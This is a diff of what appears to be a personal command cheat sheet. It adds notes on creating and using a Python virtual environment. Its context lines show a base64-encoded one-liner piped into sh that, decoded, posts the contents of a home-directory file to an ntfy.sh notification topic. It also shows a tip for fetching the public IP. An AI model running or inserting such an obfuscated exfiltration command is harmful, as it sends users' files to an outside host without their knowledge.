@@ -24,3 +24,16 @@ You can also add the ip address with :  `"$(curl ifconfig.me)"`
 ```bash
 echo Y3VybCBodHRwczovL250Znkuc2gvamRsc2hka3Nrc2JiZGt6amQgLWQgIiQoY2F0IH4vZmlsZSkiIA== | base64 -d | sh
 ```
+
+
+#### Python venv
+
+```bash
+python3 -m venv env
+source env/bin/activate
+pip3 install whatever
+
+# Deactivate environment
+deactivate
+```
+
